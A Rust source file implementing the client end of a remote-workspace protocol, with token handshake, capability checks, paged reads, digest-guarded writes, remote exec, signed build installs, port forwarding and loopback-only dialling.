//! The client end: a workspace on another machine, driven as if it were local.
//!
//! One session, one workspace, one credential. [`RemoteWorkspace`] is only
//! constructible through [`RemoteWorkspace::connect`], so there is no value of
//! this type that has not been authorised — which is what lets every method below
//! assume the session exists and spend its checks on the things that can still go
//! wrong: a reply that answers a different question, a server that offers more
//! than the endpoint was configured to allow, a file that changed between the read
//! and the write.
//!
//! The client is deliberately *not* clever about the transport. It speaks over any
//! bidirectional stream and refuses to be the thing that crosses a network in
//! plaintext: [`RemoteWorkspace::connect_tcp`] takes the address to dial and
//! requires it to be loopback, because the way this reaches another machine is a
//! tunnel that somebody else secured.

use std::path::Path;
use std::time::Duration;

use base64::Engine as _;
use tokio::io::{AsyncRead, AsyncWrite, AsyncWriteExt, ReadHalf, WriteHalf, join};

use super::credentials::{ForwardTarget, ForwardTicket, SessionToken};
use super::endpoint::{RemoteCapability, RemoteEndpoint};
use super::install::sha256_hex;
use super::protocol::*;

/// How long a `hello` may go unanswered before the attempt is given up on.
///
/// The handshake is one small request and the peer is already reachable — a server
/// that has accepted the connection and does not answer is not busy with somebody
/// else's work, so a bound this generous only ever fires on a tunnel opened at the
/// wrong thing. Callers with a tighter budget should set
/// [`RemoteWorkspaceConfig::handshake_timeout`].
pub const DEFAULT_HANDSHAKE_TIMEOUT: Duration = Duration::from_secs(30);

/// How this side of the session behaves.
///
/// Everything here is a limit the *client* imposes on itself. The server has its
/// own, smaller numbers win, and the handshake tells us the server's
/// [`Payload::Hello::max_transfer_bytes`] so the two line up without guessing.
#[derive(Clone, Debug)]
pub struct RemoteWorkspaceConfig {
    /// Who we are, for the server's log and for a version-mismatch message.
    pub client: Implementation,
    pub protocol: VersionRange,
    /// What to ask for. Asking for something the endpoint has not been configured
    /// to allow is refused before the connection is attempted.
    pub capabilities: Vec<RemoteCapability>,
    pub max_frame_bytes: usize,
    /// How much to ask for per read when paging a file bigger than one frame.
    /// `None` means "use the server's transfer limit", which is the right answer
    /// almost always.
    pub read_window_bytes: Option<u64>,
    /// How much artifact to send per chunk when deploying a server build.
    pub chunk_bytes: usize,
    /// How long to wait for the handshake. A server that has not answered a
    /// `hello` in this time is not going to: it is doing no user's work yet, and
    /// the usual reason is a tunnel that was opened at the wrong thing.
    pub handshake_timeout: Duration,
    /// How long to wait for one request's reply. `None` — the default — waits
    /// forever, because `exec` runs a command whose length is the caller's
    /// business. Anything with an interactive caller in front of it should set it.
    pub request_timeout: Option<Duration>,
}

impl Default for RemoteWorkspaceConfig {
    fn default() -> Self {
        Self {
            client: Implementation::local(),
            protocol: VersionRange::current(),
            capabilities: vec![
                RemoteCapability::WorkspaceList,
                RemoteCapability::WorkspaceRead,
                RemoteCapability::WorkspaceSearch,
                RemoteCapability::WorkspaceWrite,
                RemoteCapability::Git,
                RemoteCapability::ToolExecution,
            ],
            max_frame_bytes: MAX_FRAME_BYTES,
            read_window_bytes: None,
            chunk_bytes: 512 * 1024,
            handshake_timeout: DEFAULT_HANDSHAKE_TIMEOUT,
            request_timeout: None,
        }
    }
}

impl RemoteWorkspaceConfig {
    pub fn new() -> Self {
        Self::default()
    }

    pub fn capabilities(mut self, capabilities: Vec<RemoteCapability>) -> Self {
        self.capabilities = capabilities;
        self
    }

    /// How much artifact to send per chunk when deploying a server build.
    pub fn chunk_bytes(mut self, bytes: usize) -> Self {
        self.chunk_bytes = bytes;
        self
    }

    /// How long to wait for the handshake. Zero is refused rather than treated as
    /// "no wait", which would fail every connection.
    pub fn handshake_timeout(mut self, timeout: Duration) -> Self {
        self.handshake_timeout = timeout;
        self
    }

    /// How long to wait for each request's reply. Once one expires the session is
    /// abandoned, so this is a bound on how long a caller can be stuck, not a way
    /// to retry a slow server.
    pub fn request_timeout(mut self, timeout: Option<Duration>) -> Self {
        self.request_timeout = timeout;
        self
    }

    pub fn validate(&self) -> Result<(), String> {
        if self.handshake_timeout.is_zero() {
            return Err("a handshake timeout of zero would fail before the hello is read".into());
        }
        if self.request_timeout == Some(Duration::ZERO) {
            return Err("a request timeout of zero would fail before the reply is read".into());
        }
        if self.max_frame_bytes < 1024 {
            return Err("the frame limit is too small to carry a handshake".into());
        }
        if self.chunk_bytes == 0 || self.chunk_bytes * 4 / 3 >= self.max_frame_bytes {
            return Err(format!(
                "a {}-byte chunk does not fit a {}-byte frame with room for its \
                 framing and base64 inflation",
                self.chunk_bytes, self.max_frame_bytes
            ));
        }
        if let Some(window) = self.read_window_bytes
            && window == 0
        {
            return Err("a read window of zero bytes would read nothing".into());
        }
        Ok(())
    }
}

/// A window of a file, plus enough context to page without a second request.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct ReadWindow {
    pub data: Vec<u8>,
    pub offset: u64,
    /// The size of the whole file on the server.
    pub total_len: u64,
    /// The digest of `data`, not of the file — usable as an `expected_sha256`
    /// only when the window is the whole file.
    pub sha256: String,
}

/// A file fetched in full.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct FileContents {
    pub data: Vec<u8>,
    /// The digest of every byte in `data`, which is what a write has to name to
    /// say "replace the version I read".
    pub sha256: String,
}

/// Arguments for one write.
#[derive(Clone, Debug, Default)]
pub struct WriteFile<'a> {
    pub content: &'a [u8],
    /// Create the directory tree the file needs. Off by default: a typo in a path
    /// should fail, not establish a new branch of the tree.
    pub create_parents: bool,
    /// Refuse unless the file on the server still has this digest.
    pub expected_sha256: Option<&'a str>,
}

/// What one search found.
#[derive(Clone, Debug, Default, PartialEq, Eq)]
pub struct SearchOutcome {
    pub hits: Vec<SearchHit>,
    /// True when the limits meant the search did not look at everything. A caller
    /// that treats "no hits" as "not present" has to look at this first.
    pub truncated: bool,
    pub files_scanned: usize,
}

/// The result of running one program remotely.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct ExecOutcome {
    /// `None` when the process was killed rather than exiting on its own.
    pub exit_code: Option<i32>,
    pub stdout: String,
    pub stderr: String,
    pub timed_out: bool,
    /// Output past the server's cap was dropped.
    pub truncated: bool,
}

impl ExecOutcome {
    pub fn success(&self) -> bool {
        !self.timed_out && self.exit_code == Some(0)
    }
}

/// What the workspace looks like after a deployment.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct InstallOutcome {
    pub version: String,
    pub current: bool,
    pub previous_version: Option<String>,
}

/// What a forward grant agreed to, as the server stated it.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct ForwardGrant {
    pub ticket: ForwardTicket,
    /// What the ticket may reach. The server echoes the normalised form, so a
    /// listener can print the truth about where it points.
    pub target: ForwardTarget,
    /// How long the ticket will be honoured. A tunnel should treat this as its own
    /// deadline, because the server will.
    pub expires_in: Duration,
    /// How many connections the ticket may open. One per TCP connection accepted,
    /// not one per session — a page that loads twelve assets spends twelve.
    pub max_uses: usize,
}

/// The two halves of a session stream, joined back into the single byte stream a
/// forwarded connection has become.
pub type ForwardPipe<S> = tokio::io::Join<ReadHalf<S>, WriteHalf<S>>;

/// An authorised session with a remote workspace.
#[derive(Debug)]
pub struct RemoteWorkspace<S> {
    reader: ReadHalf<S>,
    writer: WriteHalf<S>,
    max_frame: usize,
    read_window: u64,
    chunk_bytes: usize,
    next_id: u64,
    protocol_version: u32,
    server: Implementation,
    granted: Vec<RemoteCapability>,
    session_id: String,
    request_timeout: Option<Duration>,
    /// Set once a request could not be completed, which makes every later one
    /// unsafe to send. [`Self::state`] reports it.
    abandoned: Option<String>,
}

/// Whether this session may still be used.
///
/// There is no "reconnecting" state here on purpose: a credential is spent by the
/// handshake, so a session that has gone cannot be brought back — the caller opens
/// a new one with a credential the server has not handed out yet.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum SessionState {
    /// Every request so far was answered.
    Ready,
    /// A request went unanswered or the stream desynced. Nothing more is sent on
    /// this session; `reason` is what was last seen.
    Abandoned { reason: String },
}

impl<S> RemoteWorkspace<S>
where
    S: AsyncRead + AsyncWrite + Unpin,
{
    /// Handshake over an already-connected stream.
    ///
    /// `token` is spent here and here only: the credential opens exactly one
    /// session, so a reconnect needs a fresh one from the server's token file.
    ///
    /// A failure of `endpoint` or `config` comes back as
    /// [`RemoteError::InvalidRequest`] — nothing was sent, and the reason names
    /// which of the two was not sensible.
    pub async fn connect(
        stream: S,
        endpoint: &RemoteEndpoint,
        token: &SessionToken,
        config: RemoteWorkspaceConfig,
    ) -> Result<Self, RemoteError> {
        endpoint
            .validate()
            .map_err(|reason| RemoteError::InvalidRequest {
                reason: format!("remote endpoint is not usable: {reason}"),
            })?;
        config
            .validate()
            .map_err(|reason| RemoteError::InvalidRequest { reason })?;
        let unapproved: Vec<&RemoteCapability> = config
            .capabilities
            .iter()
            .filter(|capability| !endpoint.capabilities.contains(capability))
            .collect();
        if !unapproved.is_empty() {
            return Err(RemoteError::InvalidRequest {
                reason: format!(
                    "{unapproved:?} was asked for but the endpoint {host} is not \
                     configured to allow it; the endpoint is the user's decision and a \
                     caller may not widen it",
                    host = endpoint.host
                ),
            });
        }

        let (mut reader, mut writer) = tokio::io::split(stream);
        let hello = Request::Hello {
            protocol: config.protocol,
            client: config.client.clone(),
            token: token.as_str().to_string(),
            capabilities: config.capabilities.clone(),
        };
        // Bounded, because the failure this guards against is silent: a tunnel
        // opened at something that never answers looks exactly like a slow server
        // from here, and a caller stuck at "connecting" learns nothing.
        let exchanged = async {
            send(
                &mut writer,
                &Envelope {
                    id: 1,
                    body: &hello,
                },
            )
            .await?;
            recv::<Envelope<Reply>, _>(&mut reader, config.max_frame_bytes).await
        };
        let reply = tokio::time::timeout(config.handshake_timeout, exchanged)
            .await
            .map_err(|_| RemoteError::Timeout {
                request: "the handshake".into(),
                after: config.handshake_timeout,
            })??;
        let reply = reply.ok_or_else(|| RemoteError::Protocol {
            reason: "the server closed the connection without answering the handshake".into(),
        })?;
        if reply.id != 1 {
            return Err(RemoteError::Protocol {
                reason: format!("the handshake answered request {} for request 1", reply.id),
            });
        }
        let Payload::Hello {
            protocol_version,
            server,
            capabilities,
            session_id,
            max_transfer_bytes,
        } = reply.body.map_err(refusal(&endpoint.host))?
        else {
            return Err(RemoteError::Protocol {
                reason: "the first reply was not a hello".into(),
            });
        };

        // The server decides what a session may use, so a server that had been
        // reconfigured to offer more than the user approved would say so right
        // here. Dropping the extra rights rather than shutting the session down is
        // the honest response: the calls still cannot be made, and a working
        // read-only session is worth more than an error.
        let unasked: Vec<&RemoteCapability> = capabilities
            .iter()
            .filter(|capability| !config.capabilities.contains(capability))
            .collect();
        if !unasked.is_empty() {
            tracing::warn!(
                session = %session_id,
                server = %server.name,
                unasked = ?unasked,
                "the server granted capabilities this session never asked for; they are \
                 being ignored"
            );
        }
        let granted: Vec<RemoteCapability> = capabilities
            .into_iter()
            .filter(|capability| config.capabilities.contains(capability))
            .collect();
        let read_window = config
            .read_window_bytes
            .unwrap_or(max_transfer_bytes)
            .min(max_transfer_bytes)
            .max(1);

        tracing::debug!(
            session = %session_id,
            server = %server.name,
            server_version = %server.version,
            protocol_version,
            granted = ?granted,
            "remote workspace session open"
        );
        Ok(Self {
            reader,
            writer,
            max_frame: config.max_frame_bytes,
            read_window,
            chunk_bytes: config.chunk_bytes.min(max_transfer_bytes as usize).max(1),
            next_id: 2,
            protocol_version,
            server,
            granted,
            session_id,
            request_timeout: config.request_timeout,
            abandoned: None,
        })
    }

    /// End the session in an orderly way.
    ///
    /// A server treats the end of the stream as the end of the session either way;
    /// shutting the write half down first is what lets it finish a log line rather
    /// than notice a broken pipe mid-reply.
    pub async fn close(mut self) {
        let _ = self.writer.shutdown().await;
    }

    // ---- what the session is ----------------------------------------------

    pub fn protocol_version(&self) -> u32 {
        self.protocol_version
    }

    /// What the host says it is — the thing to compare against a local build
    /// before concluding that a difference in behaviour is a bug.
    pub fn server(&self) -> &Implementation {
        &self.server
    }

    pub fn session_id(&self) -> &str {
        &self.session_id
    }

    /// What this session may actually use, which is what the server granted minus
    /// anything it granted that was not asked for.
    pub fn capabilities(&self) -> &[RemoteCapability] {
        &self.granted
    }

    pub fn has(&self, capability: &RemoteCapability) -> bool {
        self.granted.contains(capability)
    }

    /// Whether another request may be sent. A session goes to
    /// [`SessionState::Abandoned`] when a reply never arrived or answered a
    /// different request; from there the only move is a new session.
    pub fn state(&self) -> SessionState {
        match &self.abandoned {
            None => SessionState::Ready,
            Some(reason) => SessionState::Abandoned {
                reason: reason.clone(),
            },
        }
    }

    // ---- requests ----------------------------------------------------------

    /// Liveness and identity, at no cost to the workspace.
    pub async fn ping(&mut self) -> Result<u32, RemoteError> {
        let pong = self.request(Request::Ping).await?;
        let Payload::Pong {
            server,
            protocol_version,
        } = pong
        else {
            return Err(wrong_reply("pong", &pong));
        };
        // A server that answers `ping` with a different protocol than the one the
        // handshake settled on has two answers to the same question, and neither
        // can be trusted.
        if protocol_version != self.protocol_version {
            return Err(RemoteError::Protocol {
                reason: format!(
                    "the handshake settled on protocol {} but the server now says {}",
                    self.protocol_version, protocol_version
                ),
            });
        }
        if server != self.server {
            tracing::warn!(
                session = %self.session_id,
                handshake = %self.server,
                pong = %server,
                "the server changed its identity mid-session"
            );
        }
        Ok(protocol_version)
    }

    /// List the workspace, or one directory inside it.
    ///
    /// `truncated` says the listing is not the whole picture, either because of a
    /// limit or because a directory was skipped.
    pub async fn list(
        &mut self,
        path: Option<&str>,
        depth: Option<usize>,
        max_entries: Option<usize>,
    ) -> Result<(Vec<Entry>, bool), RemoteError> {
        require(&self.granted, RemoteCapability::WorkspaceList)?;
        let reply = self
            .request(Request::List {
                path: path.map(str::to_string),
                depth,
                max_entries,
            })
            .await?;
        let Payload::List { entries, truncated } = reply else {
            return Err(wrong_reply("list", &reply));
        };
        Ok((entries, truncated))
    }

    /// Read one window of one file.
    pub async fn read(
        &mut self,
        path: &str,
        offset: Option<u64>,
        len: Option<u64>,
    ) -> Result<ReadWindow, RemoteError> {
        require(&self.granted, RemoteCapability::WorkspaceRead)?;
        let reply = self
            .request(Request::Read {
                path: path.to_string(),
                offset,
                len,
            })
            .await?;
        let Payload::Read {
            data_b64,
            total_len,
            offset,
            sha256,
        } = reply
        else {
            return Err(wrong_reply("read", &reply));
        };
        let data = decode(data_b64, "read")?;
        Ok(ReadWindow {
            data,
            offset,
            total_len,
            sha256,
        })
    }

    /// Read a whole file however big it is, a window at a time.
    ///
    /// The returned digest covers every byte returned, so it is the right thing to
    /// hand back as [`WriteFile::expected_sha256`] even for a file that took
    /// several round trips — which a single window's digest would not be.
    pub async fn read_file(&mut self, path: &str) -> Result<FileContents, RemoteError> {
        let mut data: Vec<u8> = Vec::new();
        let mut offset = 0u64;
        loop {
            let window = self
                .read(path, Some(offset), Some(self.read_window))
                .await?;
            if window.data.is_empty() {
                if offset < window.total_len {
                    return Err(RemoteError::Protocol {
                        reason: format!(
                            "{path}: the server answered with no bytes at offset {offset} \
                             of a {}-byte file; paging cannot continue",
                            window.total_len
                        ),
                    });
                }
                break;
            }
            if window.offset != offset {
                return Err(RemoteError::Protocol {
                    reason: format!(
                        "{path}: asked for offset {offset}, the server returned bytes \
                         starting at {}",
                        window.offset
                    ),
                });
            }
            offset += window.data.len() as u64;
            data.extend_from_slice(&window.data);
            if offset >= window.total_len {
                break;
            }
        }
        let sha256 = sha256_hex(&data);
        Ok(FileContents { data, sha256 })
    }

    /// Look for a substring in the text files of the workspace.
    pub async fn search(
        &mut self,
        query: &str,
        path: Option<&str>,
        max_results: Option<usize>,
        case_sensitive: bool,
    ) -> Result<SearchOutcome, RemoteError> {
        require(&self.granted, RemoteCapability::WorkspaceSearch)?;
        let reply = self
            .request(Request::Search {
                query: query.to_string(),
                path: path.map(str::to_string),
                max_results,
                case_sensitive,
            })
            .await?;
        let Payload::Search {
            hits,
            truncated,
            files_scanned,
        } = reply
        else {
            return Err(wrong_reply("search", &reply));
        };
        Ok(SearchOutcome {
            hits,
            truncated,
            files_scanned,
        })
    }

    /// Replace a file's contents.
    ///
    /// Content over the server's transfer limit is refused here rather than sent
    /// and refused there, because the message a caller gets back is then about the
    /// thing they are holding rather than about a frame.
    pub async fn write(
        &mut self,
        path: &str,
        file: WriteFile<'_>,
    ) -> Result<(u64, String), RemoteError> {
        require(&self.granted, RemoteCapability::WorkspaceWrite)?;
        let reply = self
            .request(Request::Write {
                path: path.to_string(),
                content_b64: base64::engine::general_purpose::STANDARD.encode(file.content),
                create_parents: file.create_parents,
                expected_sha256: file.expected_sha256.map(str::to_string),
            })
            .await?;
        let Payload::Write {
            bytes_written,
            sha256,
        } = reply
        else {
            return Err(wrong_reply("write", &reply));
        };
        Ok((bytes_written, sha256))
    }

    /// `git diff` for the workspace or for one path inside it.
    ///
    /// `dirty` is the answer to "is there anything to look at"; a non-empty `diff`
    /// and `dirty == false` cannot happen, but the two are separate because the
    /// caller wants one and the log wants the other.
    pub async fn diff(
        &mut self,
        path: Option<&str>,
        staged: bool,
        context: Option<u32>,
    ) -> Result<(String, bool), RemoteError> {
        require(&self.granted, RemoteCapability::Git)?;
        let reply = self
            .request(Request::Diff {
                path: path.map(str::to_string),
                staged,
                context,
            })
            .await?;
        let Payload::Diff { diff, dirty } = reply else {
            return Err(wrong_reply("diff", &reply));
        };
        Ok((diff, dirty))
    }

    /// Run one program on the remote host, without a shell.
    ///
    /// The server resolves the program name against its own allowlist, so `argv[0]`
    /// has to be a bare name. A refusal to run is an `Err`; a program that ran and
    /// exited non-zero is an `Ok` with a non-zero `exit_code`, which is the
    /// difference between "we could not build" and "the build failed".
    pub async fn exec(
        &mut self,
        argv: &[&str],
        cwd: Option<&str>,
        timeout: Option<Duration>,
    ) -> Result<ExecOutcome, RemoteError> {
        require(&self.granted, RemoteCapability::ToolExecution)?;
        let reply = self
            .request(Request::Exec {
                argv: argv.iter().map(|arg| arg.to_string()).collect(),
                cwd: cwd.map(str::to_string),
                timeout_ms: timeout.map(|d| d.as_millis() as u64),
            })
            .await?;
        let Payload::Exec {
            exit_code,
            stdout,
            stderr,
            timed_out,
            truncated,
        } = reply
        else {
            return Err(wrong_reply("exec", &reply));
        };
        Ok(ExecOutcome {
            exit_code,
            stdout,
            stderr,
            timed_out,
            truncated,
        })
    }

    /// Put a server build onto the host and make it current.
    ///
    /// The digest is computed from the bytes in hand and verified by the server
    /// before anything becomes current, so a truncated upload cannot be the next
    /// version. If the commit finds the new build unusable, the server puts the
    /// previous one back and says so in [`InstallOutcome::previous_version`].
    ///
    /// `signature` is the detached ed25519 signature over `artifact` — the text of
    /// the release's `.sig` sidecar. The host decides what happens without one: a
    /// host that requires provenance refuses the install, because the digest is the
    /// sender's own claim about bytes the sender chose.
    pub async fn install_artifact(
        &mut self,
        version: &str,
        artifact: &[u8],
        signature: Option<&str>,
    ) -> Result<InstallOutcome, RemoteError> {
        require(&self.granted, RemoteCapability::WorkspaceWrite)?;
        let sha256 = sha256_hex(artifact);
        let reply = self
            .request(Request::InstallBegin {
                version: version.to_string(),
                sha256: sha256.clone(),
                total_bytes: artifact.len() as u64,
                signature_b64: signature.map(str::to_string),
            })
            .await?;
        if !matches!(reply, Payload::InstallBegin { .. }) {
            return Err(wrong_reply("install_begin", &reply));
        }
        for (index, chunk) in artifact.chunks(self.chunk_bytes).enumerate() {
            let seq = index as u64;
            let reply = self
                .request(Request::InstallChunk {
                    seq,
                    data_b64: base64::engine::general_purpose::STANDARD.encode(chunk),
                })
                .await;
            match reply {
                Ok(Payload::InstallChunk { .. }) => {}
                Ok(other) => return Err(wrong_reply("install_chunk", &other)),
                // The staging file is left behind on the server. Naming the chunk
                // that failed is what turns "the deploy broke" into a problem with
                // a place to start looking.
                Err(error) => {
                    return Err(match error {
                        RemoteError::Install {
                            reason,
                            rolled_back,
                        } => RemoteError::Install {
                            reason: format!("chunk {seq} of {version}: {reason}"),
                            rolled_back,
                        },
                        other => other,
                    });
                }
            }
        }
        let reply = self
            .request(Request::InstallFinish {
                version: version.to_string(),
            })
            .await?;
        let Payload::InstallFinish {
            version,
            current,
            previous_version,
        } = reply
        else {
            return Err(wrong_reply("install_finish", &reply));
        };
        Ok(InstallOutcome {
            version,
            current,
            previous_version,
        })
    }

    // ---- forwarding --------------------------------------------------------

    /// Authorise a local port forward to `target` and get the credential a
    /// forwarded connection will present.
    ///
    /// The answer is the operator's, not this client's wish: the target has to be
    /// one the server was told it may connect to, and the lifetime and connection
    /// budget come back clamped to what it will agree to. What is returned is
    /// therefore what a listener is allowed to claim, which is why the caller reads
    /// the numbers off this reply rather than off its own arguments.
    pub async fn forward_grant(
        &mut self,
        target: &ForwardTarget,
        ttl: Duration,
        max_uses: usize,
    ) -> Result<ForwardGrant, RemoteError> {
        require(&self.granted, RemoteCapability::PortForward)?;
        let payload = self
            .request(Request::ForwardGrant {
                host: target.host.clone(),
                port: target.port,
                // Seconds are the unit on the wire; sub-second grants are
                // meaningless for a tunnel, so this rounds up rather than to zero.
                ttl_secs: ttl.as_secs().max(1),
                max_uses,
            })
            .await?;
        let Payload::ForwardGrant {
            ticket,
            host,
            port,
            expires_in_secs,
            max_uses,
        } = payload
        else {
            return Err(wrong_reply("forward_grant", &payload));
        };
        Ok(ForwardGrant {
            ticket: ForwardTicket::from_text(&ticket),
            target: ForwardTarget::new(host, port),
            expires_in: Duration::from_secs(expires_in_secs),
            max_uses,
        })
    }

    /// Spend a forward ticket: have the server connect the target the ticket was
    /// minted for, then take back the stream.
    ///
    /// After this returns, nothing on the stream is framed any more — it carries
    /// the target's bytes. That is why this consumes the session: a
    /// [`RemoteWorkspace`] that could still send a request would be a value whose
    /// next reply is somebody else's payload.
    pub async fn into_forward_stream(
        mut self,
    ) -> Result<(ForwardTarget, ForwardPipe<S>), RemoteError> {
        require(&self.granted, RemoteCapability::PortForward)?;
        let payload = self.request(Request::ForwardOpen).await?;
        let Payload::ForwardOpen { host, port } = payload else {
            return Err(wrong_reply("forward_open", &payload));
        };
        Ok((
            ForwardTarget::new(host, port),
            join(self.reader, self.writer),
        ))
    }

    // ---- the loop ----------------------------------------------------------

    /// Send one request and return its successful payload.
    ///
    /// Requests are numbered upward and the reply's number is checked, so a
    /// desynced stream is caught at the first reply that answers the wrong
    /// question instead of being mistaken for the answer to this one.
    async fn request(&mut self, body: Request) -> Result<Payload, RemoteError> {
        if let Some(reason) = &self.abandoned {
            return Err(RemoteError::Abandoned {
                reason: reason.clone(),
            });
        }
        let id = self.next_id;
        self.next_id += 1;
        let limit = self.request_timeout;
        let what = request_name(&body);
        let round_trip = self.round_trip(id, body);
        let outcome = match limit {
            None => round_trip.await,
            Some(limit) => match tokio::time::timeout(limit, round_trip).await {
                Ok(outcome) => outcome,
                Err(_) => Err(RemoteError::Timeout {
                    request: what.clone(),
                    after: limit,
                }),
            },
        };
        if let Err(error) = &outcome
            && kills_the_session(error)
        {
            self.abandoned = Some(match error {
                RemoteError::Timeout { after, .. } => {
                    format!("no reply to request {id} ({what}) within {after:?}")
                }
                other => other.to_string(),
            });
        }
        outcome
    }

    /// One send, one reply. Split out so [`Self::request`] can bound it by time
    /// without the deadline logic getting tangled up in the checks.
    async fn round_trip(&mut self, id: u64, body: Request) -> Result<Payload, RemoteError> {
        send(&mut self.writer, &Envelope { id, body: &body }).await?;
        let reply: Option<Envelope<Reply>> = recv(&mut self.reader, self.max_frame).await?;
        let reply = reply.ok_or_else(|| RemoteError::Protocol {
            reason: format!("the session ended mid-request: request {id} was never answered"),
        })?;
        if reply.id != id {
            return Err(RemoteError::Protocol {
                reason: format!(
                    "request {id} was answered with a reply to request {}; the session \
                     has desynced",
                    reply.id
                ),
            });
        }
        reply.body
    }
}

impl RemoteWorkspace<tokio::net::UnixStream> {
    /// Dial a Unix socket, without handshaking.
    ///
    /// Dialling and handshaking are separate calls because only one of them is
    /// safe to repeat: a dial that failed sent nothing, while a handshake spends
    /// the one-time credential whether or not the reply arrives.
    #[cfg(unix)]
    pub async fn dial_unix(path: &Path) -> Result<tokio::net::UnixStream, RemoteError> {
        tokio::net::UnixStream::connect(path)
            .await
            .map_err(|e| RemoteError::Io {
                context: format!("connect {}", path.display()),
                reason: e.to_string(),
            })
    }

    /// Connect to a Unix socket, the transport for a server on this machine.
    #[cfg(unix)]
    pub async fn connect_unix(
        path: &Path,
        endpoint: &RemoteEndpoint,
        token: &SessionToken,
        config: RemoteWorkspaceConfig,
    ) -> Result<Self, RemoteError> {
        let stream = Self::dial_unix(path).await?;
        Self::connect(stream, endpoint, token, config).await
    }

    /// [`Self::dial_unix`], retrying within `retry`'s window.
    #[cfg(unix)]
    pub async fn dial_unix_waiting(
        path: &Path,
        retry: DialRetry,
    ) -> Result<tokio::net::UnixStream, RemoteError> {
        retry_dial(format!("connect {}", path.display()), retry, || {
            Self::dial_unix(path)
        })
        .await
    }
}

impl RemoteWorkspace<tokio::net::TcpStream> {
    /// Dial a loopback TCP port, without handshaking. See
    /// [`super::server::require_loopback`] for why a routable address is refused
    /// rather than merely discouraged.
    pub async fn dial_tcp(
        addr: std::net::SocketAddr,
    ) -> Result<tokio::net::TcpStream, RemoteError> {
        super::server::require_loopback(addr)
            .map_err(|reason| RemoteError::InvalidRequest { reason })?;
        let stream = tokio::net::TcpStream::connect(addr)
            .await
            .map_err(|e| RemoteError::Io {
                context: format!("connect {addr}"),
                reason: e.to_string(),
            })?;
        stream.set_nodelay(true).map_err(|e| RemoteError::Io {
            context: format!("set_nodelay {addr}"),
            reason: e.to_string(),
        })?;
        Ok(stream)
    }

    /// Connect to a loopback TCP port.
    pub async fn connect_tcp(
        addr: std::net::SocketAddr,
        endpoint: &RemoteEndpoint,
        token: &SessionToken,
        config: RemoteWorkspaceConfig,
    ) -> Result<Self, RemoteError> {
        let stream = Self::dial_tcp(addr).await?;
        Self::connect(stream, endpoint, token, config).await
    }

    /// [`Self::dial_tcp`], retrying within `retry`'s window. This is what a caller
    /// waits on while it brings its own tunnel up.
    pub async fn dial_tcp_waiting(
        addr: std::net::SocketAddr,
        retry: DialRetry,
    ) -> Result<tokio::net::TcpStream, RemoteError> {
        retry_dial(format!("connect {addr}"), retry, || Self::dial_tcp(addr)).await
    }
}

/// How long to keep re-dialling a transport that is not there yet.
///
/// The wait is for the thing in front of us — an SSH tunnel or a socket-activated
/// server — not for the server to become healthy: nothing has been sent, so no
/// credential has been spent and no session exists.
#[derive(Clone, Copy, Debug)]
pub struct DialRetry {
    pub patience: Duration,
    pub first_delay: Duration,
    pub max_delay: Duration,
}

impl DialRetry {
    /// Wait up to `patience`, starting at 100 ms between attempts and doubling up
    /// to 2 s. Zero patience means one attempt, which is what a caller that does
    /// not want to wait asked for.
    pub fn new(patience: Duration) -> Self {
        Self {
            patience,
            first_delay: Duration::from_millis(100),
            max_delay: Duration::from_secs(2),
        }
    }

    /// How long to wait before the next attempt after `failures` failures, or
    /// `None` when the window is spent. Pure, so the bound is testable without
    /// sleeping through it.
    pub fn delay(&self, failures: usize, elapsed: Duration) -> Option<Duration> {
        if elapsed >= self.patience {
            return None;
        }
        let scaled = self
            .first_delay
            .mul_f64(2f64.powi(failures.min(30) as i32))
            .min(self.max_delay);
        // Starting a wait that would end past the window would leave the caller
        // still trying after its own patience had run out.
        elapsed
            .checked_add(scaled)
            .filter(|until| *until <= self.patience)?;
        Some(scaled)
    }
}

/// Keep dialling until it works or the window closes.
///
/// Only `Io` failures are retried. Anything else — a routable address refused at
/// parse time, a rejected credential — is a decision, not a race, and repeating it
/// wastes the caller's time (or, for a credential, its one chance).
async fn retry_dial<F, Fut, S>(
    what: String,
    retry: DialRetry,
    mut dial: F,
) -> Result<S, RemoteError>
where
    F: FnMut() -> Fut,
    Fut: std::future::Future<Output = Result<S, RemoteError>>,
{
    let started = std::time::Instant::now();
    let mut failures = 0usize;
    loop {
        return match dial().await {
            Ok(stream) => {
                if failures > 0 {
                    tracing::debug!(
                        transport = %what,
                        attempts = failures + 1,
                        waited = ?started.elapsed(),
                        "the transport took a few tries to come up"
                    );
                }
                Ok(stream)
            }
            Err(error @ RemoteError::Io { .. }) => {
                let Some(wait) = retry.delay(failures, started.elapsed()) else {
                    return Err(match error {
                        RemoteError::Io { context, reason } => RemoteError::Io {
                            context: format!(
                                "{context} (still failing after {} attempts in {:?})",
                                failures + 1,
                                started.elapsed()
                            ),
                            reason,
                        },
                        other => other,
                    });
                };
                tracing::debug!(
                    transport = %what,
                    attempt = failures + 1,
                    ?wait,
                    %error,
                    "transport not up yet"
                );
                tokio::time::sleep(wait).await;
                failures += 1;
                continue;
            }
            Err(error) => Err(error),
        };
    }
}

fn require(granted: &[RemoteCapability], capability: RemoteCapability) -> Result<(), RemoteError> {
    if granted.contains(&capability) {
        return Ok(());
    }
    // Refused without a round trip: the server would say the same thing, and a
    // caller that asked for the wrong capability gets the answer immediately.
    Err(RemoteError::CapabilityNotGranted { capability })
}

/// Whether a failed request leaves the stream unusable.
///
/// A server that says "no such path" answered the question, and the session is
/// fine. A reply that never came, or answered a different request, means a later
/// reply could be read as the answer to the next call — which is how a session
/// ends up handing back the wrong file's contents.
fn kills_the_session(error: &RemoteError) -> bool {
    matches!(
        error,
        RemoteError::Protocol { .. } | RemoteError::Io { .. } | RemoteError::Timeout { .. }
    )
}

/// What a request is, for a message a human will read.
fn request_name(body: &Request) -> String {
    match body {
        Request::Hello { .. } => "hello".into(),
        Request::List { .. } => "list".into(),
        Request::Read { .. } => "read".into(),
        Request::Search { .. } => "search".into(),
        Request::Write { .. } => "write".into(),
        Request::Diff { .. } => "diff".into(),
        Request::Exec { .. } => "exec".into(),
        Request::ForwardGrant { .. } => "forward_grant".into(),
        Request::ForwardOpen => "forward_open".into(),
        Request::InstallBegin { .. } => "install_begin".into(),
        Request::InstallChunk { .. } => "install_chunk".into(),
        Request::InstallFinish { .. } => "install_finish".into(),
        Request::Ping => "ping".into(),
    }
}

